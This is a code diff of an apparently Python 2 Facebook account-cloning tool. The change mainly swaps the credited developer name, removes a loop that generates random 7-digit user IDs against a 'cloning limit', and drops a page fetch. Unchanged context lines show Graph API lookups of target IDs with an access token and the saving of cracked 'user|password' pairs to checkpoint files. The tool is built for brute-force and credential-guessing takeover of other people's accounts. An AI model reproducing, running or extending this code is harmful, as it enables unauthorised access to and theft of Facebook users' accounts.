@@ -38,7 +38,6 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-free_fb = session.get('https://free.facebook.com').text
 br.addheader_freefb = {"authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
@@ -10627,8 +10626,6 @@ reactiongroup = []
 comment = []
 group_comment = []
 listgroup = []
-ugen2=[]
-ugen=[]
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
@@ -10672,14 +10669,6 @@ while (loop == 'true'):
         print "\033[1;97mWrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 
-	print("")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    
-    
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -11281,7 +11270,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;97m[+] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m«-----------------\033[1;97mRdx\033[1;97m---------------»"
+		print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -11339,7 +11328,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:Rdx
+			pass #Dev:love_hacker
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -12360,7 +12349,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass#Dev:Rdx
+			pass#Dev:Tech-Aahil
 		try:
 			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			l = json.loads(a.text)
@@ -13150,7 +13139,7 @@ def pilih_isi():
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m--------------------»"
 	jalan(' \033[1;97mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;97m          Start Cloning Rdx')
+        jalan(' \033[1;97m          Start Cloning Black Mafia')
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m--------------------»"
 	
 			
@@ -13263,7 +13252,8 @@ def pilih_isi():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-														
+																	
+															
 		except:
 			pass
 		
@@ -14646,8 +14636,7 @@ def action():
 #					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 #					        cps.close()
 #					        cpb.append(c+user+pass2)
-            
-							
+																	
 															
 		except:
 			pass
